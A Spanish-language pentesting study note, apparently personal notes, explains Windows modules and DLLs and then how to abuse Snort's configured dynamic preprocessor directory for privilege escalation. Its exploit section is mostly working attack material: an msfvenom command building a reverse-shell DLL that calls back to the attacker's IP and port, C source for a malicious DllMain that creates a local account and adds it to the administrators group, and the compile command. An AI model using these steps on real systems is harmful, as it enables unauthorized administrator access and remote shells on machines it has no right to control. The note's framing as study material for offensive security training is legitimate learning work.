# Modules & Dynamic Modules

Un *module* (*Módulo*) en Windwos generalmente se refiere a un archivo que contiene código ejecutable y recursos que epueden ser utilizados por un programa. Los tipos más comunes de móodulos son:

- **Ejecutables** (**.exe**): Archivos que contienen un programa completo que puede ser ejecutado por el sistema operativo.
- **Librerías de Enlace Dinámico** (**.dll**): Archivos que contiene código y datos que pueden ser utilizados por múltiples programas simultáneamente.

Los módulos permiten que el código sea compartido entre diferentes programas, lo que reduce la duplicación de código y facilita el mantenimiento.

Por otro lado, los *Dynamic Modules* (*Módulos dinámicos*) son módulos que pueden ser cargados en tiempo de ejecución, el lugar de estar vinculados estáticamente en el momento de la compilación. Este concepto se aplica principalmente a las *DLLs* (*Dynamic Link Libraries*). En otras palabras, una aplicación puede decidir en tiempo de ejecución si necesita cargar un módulo específico y puede descargarlo cuando ya no lo necesita.

----
# Abusing Dynamic Modules

El *abuso de módulos dinámicos* es una técnica que aprovecha cómo las aplicaciones cargan dinámicamente bibliotecas de enlace dinámico (DLLs) o módulos para inyectar código malicioso o sustituir módulos legítimos. Esto puede permitir a un atacante ejecutar código con privilegios elevados o acceder a recursos restringidos.

Cuando una aplicación necesita una funcionalidad adicional o recursos que no están compilados en el ejecutable principal, puede cargar módulos dinámicos (Como DLLs) en tiempo de ejecución, en este momento, Windows sigue una secuencia de rutas específicas para buscar el archivo necesario. Si un atacante logra colocar una DLL maliciosa en uan de las ubicaciones que se buscan antes que la DLL legítima, la aplicación puede cargar y ejecutar código malicioso. (Esto se lo conoce como *DLL Hijacking*)

Pero, en algunos casos, existen herramientas que si revisamos su manual de uso, podemos encontrarnos con secciones que hacen alución a *Dynamic Modules load*, donde nos indican el funcionamiento y uso de la posibiilidad de la carga de módulos dinámicos, lo que nos puede abrir la ventana de explotación creando y cargando nuestro propio *dynamic module* sin necesidad de secuestrar uno (*DLL Hijacking*). 

-----
# Exploit

La explicación de explotación de está técnica será dada con el conocido software *Snort*, el cual es un sistema de detección de intrusiones a nivel de red (IDS - Intrusion Detection System) de código abierto.

En este caso podríamos estar enfrentandonos a un sistema que hace uso de este software y podríamos pensar en hacer una breve búsqueda del manual de uso de está misma para visualizar si existe algun apartado referido a la *carga de módulos dynámicos*.

Tras llevar a cabo esta acción, nos encontramos en el manual de uso, sección "Dynamic Modules":

![[dynamic_module_injection_software_manual_example.png]]

Podemos ver que nos indica las diferentes maneras de carga de módulos dinámicos que lleva a cabo esta herramienta, tanto para los `preprocessor`, la`engine` y  la `detection`, y así mismo vemos que tiene la opción de que se le indique una *.dll* en particular (*file*) o un directorio en el cual encontraremos múltiples DLLs (*shared library path*). En este caso podríamos buscar el archivo de configuración de esta herramienta (Archivo en el cual se configuran estas "opciones" - *snort.conf*).

```bash
cat snort.conf | grep -i dynamicpreprocessor
```

Tras la ejecución del comando anterior, podríamos ver un stdout tal que así:

```bash
dynamipreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
```

Tras este output, podemos entender que la carga de módulos dinámicos para los `preprocessor` se esta haciendo a nivel de *directorio* y este esta configurado en `C:\Snort\lib\snort_dynamicpreprocessor`, donde en caso de disponer de permisos de escritura, podríamos crear una *.dll* maliciosa para que a la hora de la carga de estas DLLs, se carge nuestra DLL maliciosa y ejecute la tarea que hayamos indicado. 

Facilmente podríamos crear una DLL maliciosa con la herramienta `msfvenom` para obtener una simple **reverse shell**:

```bash
msfvenom -p /windows/x64/shell_reverse_tcp LHOST={our_IP} LPORT={our_PORT} -f dll -a x64 -o malicious.dll
```

Tras esta ejecución, tendrémos una DLL maliciosa que tras ser cargada dinámicamente por un software, nos enviara una reverse shell a un determinado puerto por nuestra IP de atacante. Es importante tener en cuenta que en sistemas avanzados con alta seguridad, payloads generados por herramientas populares como `msfvenom` pueden ser simplemente detectados, por lo que llevar a cabo este proceso de manera manual podría ser mucho más óptimo, para esto podríamos seguir guías como la de [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking).

Podemos crear distintas DLLs según el compilador que tengamos, por ejemplo, para compiladores como *x86_64-w64-mingw32-gcc* o *i686-w64-mingw32-gcc* podríamos crear un simple DLL con el siguiente código:

- Archivo `pre_dll.c`
```C
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /c net user dobliuw dobliuw123! /add; net localgroup administrators dobliuw /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

Una vez creado el archivo, deberemos usar el compilador para crear la DLL:

```bash
x86_64-w64-mingw32-gcc pre_dll.c -shared -o final.dll
```

Una vez realizado esto, tendremos nuestra DLL maliciosa (`final.dll`, por ejemplo) la cual podremos (Siguiendo el ejemplo) mover, copiar, o crear de primeras, en el directorio de nuestro interes (`C:\Snort\lib\snort_dynamicpreprocessor`, por ejemplo). Una vez que esta DLL sea cargada de manera dinámica en proceso de ejecución, se ejecutará el código indicado, donde en caso de que el proceso principal que carga las DLLs (En nuestro ejemplo *Snort*) sea ejecutado por el usuario *Administrator*, estaremos creando un nuevo usuario y agregandolo al grupo de administrators.


